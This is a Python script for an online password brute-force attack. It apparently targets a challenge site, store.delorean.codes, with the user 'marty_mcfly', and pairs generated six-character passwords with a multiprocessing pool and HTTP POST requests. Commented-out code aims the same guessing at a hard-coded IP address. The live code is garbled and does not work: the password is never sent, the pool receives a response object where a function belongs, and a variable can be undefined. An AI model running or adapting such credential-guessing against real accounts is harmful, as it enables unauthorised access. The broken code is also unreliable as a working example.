from __future__ import print_function
import sys
import time
import itertools

from base64          import b64encode
from itertools       import repeat
from multiprocessing import Pool
from string          import digits
from timeit          import default_timer as timer

try:
    import requests
except ImportError:
    from http.client import HTTPSConnection # py3k

try:
    from itertools   import izip as zip
except ImportError: # py3k
    zip = zip


def gen_passwords(): # ~400K/s
    combinations = itertools.combinations("abcdefghijklmnopqrstuvwxyz1234567890", 6)
    for guess in combinations:
            yield ''.join(guess)


def report_error(*args):
    print("error %s" % (args,), file=sys.stderr)

url = "https://store.delorean.codes/u/likeaj6/"

conn = None
def check(user, password, nretries=0): # ~1100/s
    # global conn  # use 1 connection per process
    # if conn is None:
    #     conn = HTTPSConnection('104.196.126.94',443)
    # conn.request('POST', '/', headers={'username':'marty_mcfly', 'password': password}) # see rfc5987
    # r = conn.getresponse()
    # r.read() # should read before sending the next request
    #
    # if r.status == 401:
    #     return
    # elif r.status == 200:
    #     return (user, password)
    # elif nretries > 0: # retry
    #     time.sleep(5./nretries**2)
    #     return check(user, password, nretries=nretries-1)
    # else:
    #     report_error((user, password), r.status)
    http = requests.post(url, data={'to=biff_tannen'})
    content = http.content
    if "Bad Password" in content:
        print(http.headers)
    else:
        print("SUCCESS :" + password)
        return


def mp_check(args):
    global conn
    try:
        return check(*args)
    except Exception as e:
        report_error(args, e)
        import traceback
        traceback.print_exc(file=sys.stderr)

        try: conn.close() # prevent fd leaks
        except: pass
        conn = None # reset connection


def main():
    user = "marty_mcfly"

    start = timer()
    pool = Pool(processes=10)
    # args = zip(repeat(user), gen_passwords())
    for n, found in enumerate(pool.imap_unordered(requests.post(url, data={'to=biff_tannen'}))):
        # t = timer() - start
        # print("Processed %d passwords in %.2f seconds (%.0f p/s)" % (n, t, n/t))
        if found:
            print("found %s" % (found,))
            break
    t = timer() - start
    print("Processed %d passwords in %.2f seconds (%.0f p/s)" % (n, t, n/t))


if __name__=="__main__":
    main()
